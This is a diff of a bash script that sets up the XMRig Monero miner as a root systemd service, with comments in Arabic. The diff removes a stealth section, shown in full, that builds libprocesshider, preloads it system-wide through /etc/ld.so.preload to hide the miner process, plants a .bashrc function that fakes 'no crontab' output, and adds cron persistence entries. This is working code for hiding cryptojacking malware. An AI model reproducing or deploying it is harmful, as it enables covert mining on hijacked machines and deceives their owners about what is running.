@@ -1,6 +1,6 @@
 #!/bin/bash
 # ====================================
-# XMRig Auto Setup Script + Rootkit Features
+# XMRig Auto Setup Script
 # Monero Mining - MoneroOcean Pool
 # ====================================
 
@@ -13,31 +13,34 @@ XMRIG_VERSION="6.22.2"
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
 
 echo "======================================"
-echo " XMRig Mining Setup + Stealth"
+echo " XMRig Mining Setup"
 echo " Worker: $WORKER"
 echo " Threads: $THREADS"
 echo " Pool: $POOL"
 echo "======================================"
 
-# ========== تثبيت المتطلبات ==========
+# تثبيت المتطلبات
 echo "[*] Installing dependencies..."
 apt-get update -qq
-apt-get install -y -qq tar libhwloc-dev python3 git make gcc 2>/dev/null
+apt-get install -y -qq tar libhwloc-dev python3 2>/dev/null
 
-# ========== إنشاء مجلد التثبيت ==========
+# إنشاء مجلد التثبيت
 mkdir -p $INSTALL_DIR
 cd $INSTALL_DIR
 
-# ========== دالة التحميل ==========
+# دالة التحميل - تجرب wget ثم curl ثم python3
 download_file() {
     local url=$1
     local output=$2
+    
     if command -v wget &>/dev/null; then
         wget -q "$url" -O "$output" && return 0
     fi
+    
     if command -v curl &>/dev/null; then
         curl -sL "$url" -o "$output" && return 0
     fi
+    
     if command -v python3 &>/dev/null; then
         python3 -c "
 import urllib.request
@@ -46,12 +49,14 @@ urllib.request.urlretrieve('$url', '$output')
 print('Done!')
 " && return 0
     fi
+    
     return 1
 }
 
-# ========== تحميل XMRig ==========
+# تحميل XMRig
 echo "[*] Downloading XMRig v${XMRIG_VERSION}..."
 download_file "$XMRIG_URL" "xmrig.tar.gz"
+
 if [ ! -f xmrig.tar.gz ] || [ ! -s xmrig.tar.gz ]; then
     echo "[!] Download failed!"
     exit 1
@@ -62,7 +67,6 @@ tar -xzf xmrig.tar.gz --strip-components=1
 rm xmrig.tar.gz
 chmod +x xmrig
 
-# ========== إنشاء config.json ==========
 echo "[*] Creating config..."
 cat > $INSTALL_DIR/config.json << EOF
 {
@@ -88,37 +92,7 @@ cat > $INSTALL_DIR/config.json << EOF
 }
 EOF
 
-# ========== تثبيت libprocesshider ==========
-echo "[*] Installing libprocesshider..."
-git clone https://github.com/gianlucaborello/libprocesshider.git /tmp/libprocesshider
-cd /tmp/libprocesshider
-make
-cp libprocesshider.so /usr/local/lib/
-echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
-echo "xmrig" > /etc/libprocesshider.conf
-cd $INSTALL_DIR
-
-# ========== تعديل .bashrc ==========
-echo "[*] Modifying .bashrc..."
-cat >> ~/.bashrc << 'EOF'
-# إخفاء crontab
-function crontab() {
-    if [[ "$1" == "-l" ]]; then
-        echo "no crontab for $(whoami)"
-    else
-        command crontab "$@"
-    fi
-}
-export -f crontab
-export LD_PRELOAD=/usr/local/lib/libprocesshider.so
-EOF
-
-# ========== إضافة مهام crontab ==========
-echo "[*] Adding crontab entries..."
-(crontab -l 2>/dev/null; echo "@reboot /opt/xmrig/xmrig --config=/opt/xmrig/config.json > /dev/null 2>&1 &") | crontab -
-(crontab -l 2>/dev/null; echo "* * * * * /opt/xmrig/xmrig --config=/opt/xmrig/config.json > /dev/null 2>&1 &") | crontab -
-
-# ========== إنشاء systemd service ==========
+# إنشاء systemd service
 echo "[*] Creating systemd service..."
 cat > /etc/systemd/system/xmrig.service << EOF
 [Unit]
@@ -132,20 +106,20 @@ Restart=always
 RestartSec=10
 User=root
 Nice=10
-Environment=LD_PRELOAD=/usr/local/lib/libprocesshider.so
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# ========== تفعيل وتشغيل الخدمة ==========
+# تفعيل وتشغيل الـ service
 echo "[*] Starting XMRig service..."
 systemctl daemon-reload
 systemctl enable xmrig
 systemctl start xmrig
 
-# ========== التحقق ==========
+# انتظر ثواني وتحقق
 sleep 5
+
 if systemctl is-active --quiet xmrig; then
     echo ""
     echo "======================================"
